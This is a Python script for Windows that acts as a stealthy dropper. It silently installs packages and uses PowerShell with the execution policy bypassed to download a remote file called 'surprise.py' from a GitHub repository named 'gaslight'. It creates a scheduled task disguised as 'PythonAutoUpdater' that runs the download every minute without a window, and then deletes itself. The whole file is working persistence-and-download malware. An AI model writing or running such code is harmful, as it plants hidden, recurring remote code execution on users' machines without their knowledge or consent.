import os
import subprocess
import sys
import time
import shutil

# List of required Python packages
required_packages = ["Pillow", "requests"]

# Function to install missing dependencies
def install_dependencies():
    """Check and install missing dependencies."""
    for package in required_packages:
        try:
            __import__(package)  # Try importing the package
        except ImportError:
            print(f"[-] {package} not found, installing...")
            subprocess.run([sys.executable, "-m", "pip", "install", package], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Ensure dependencies are installed before continuing
install_dependencies()

# Scheduled Task Name
task_name = "PythonAutoUpdater"

# Direct GitHub raw link to the Python script
python_script_url = "https://raw.githubusercontent.com/davidkennedy02/gaslight/refs/heads/main/surprise.py"

# Path to store the downloaded script
script_path = os.path.join(os.environ["APPDATA"], "surprise.py")

# Locate pythonw.exe (default location or from PATH)
python_executable = shutil.which("pythonw")  # Checks if pythonw.exe is in PATH
if not python_executable:
    # Manually set a likely Python path if not found
    python_executable = os.path.expandvars(r"%LOCALAPPDATA%\Programs\Python\Python310\pythonw.exe")

# Step 1: PowerShell Script to Download and Execute surprise.py
powershell_script = f'''
$ScriptPath = "{script_path}"
Invoke-WebRequest -Uri "{python_script_url}" -OutFile $ScriptPath
'''

# Run PowerShell script to download the Python script
subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", powershell_script], check=True)

# Step 2: Create the Scheduled Task to Run Python Directly
if os.path.exists(script_path):
    print(f"✅ Successfully downloaded: {script_path}")
else:
    print("❌ Download failed.")

# Corrected schtasks command to run Python directly
create_task_command = f'''
schtasks /create /tn "{task_name}" /tr "{python_executable} {script_path}" /sc minute /mo 1 /f
'''

# Execute the Scheduled Task Creation Command
os.system(create_task_command)

# Step 3: Self-Delete Setup Script
current_script_path = os.path.realpath(__file__)
time.sleep(2)
subprocess.Popen(f'cmd.exe /c del "{current_script_path}"', shell=True)
sys.exit()
